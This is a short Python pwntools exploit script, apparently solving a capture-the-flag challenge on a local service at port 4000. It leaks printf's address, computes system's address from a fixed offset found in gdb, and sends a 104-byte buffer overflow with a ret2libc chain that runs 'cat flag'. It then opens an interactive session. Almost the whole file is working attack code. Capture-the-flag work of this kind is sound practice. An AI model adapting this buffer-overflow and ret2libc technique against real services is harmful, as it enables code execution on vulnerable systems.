#!/usr/bin/env python2.7
from pwn import *
"""
In gdb:
    p system
    $2 = {<text variable, no debug info>} 0xf7e18eb0 <system>

    p printf
    $3 = {<text variable, no debug info>} 0xf7e27450 <printf>

In python:
    systemaddr=int("0xf7e18eb0",16)
    printfaddr=int("0xf7e27450",16)
    hex(printfadd-systemaddr)
    0xe5a0
    printfaddr-systemaddr
    58784
"""
CTRL_STRING_ADDRESS=0x08049940
PRINTF_SYSTEM_DISTANCE=58784

conn = remote('localhost',4000)
print ">>>>Waiting for intro<<<<"
print conn.recvuntil('name')
#conn.send("/bin/sh/\n")
conn.send("/usr/bin/cat flag".ljust(39))
print conn.recvuntil('>')
print ">>>>Sending 'fuffa'<<<<"
conn.send("fuffa\n")
print conn.recvuntil("fuffa\n")
print ">>>>Reading printf address<<<<"
printf_addr=conn.recvline()
printf_addr=long(printf_addr,16)
system_addr=printf_addr-PRINTF_SYSTEM_DISTANCE
print "System Addr: " + hex(system_addr)
system_packed=p32(system_addr)
ctrl_packed=p32(CTRL_STRING_ADDRESS)
conn.send("A"*104 + system_packed + ctrl_packed + "BBBB\n")
conn.interactive()

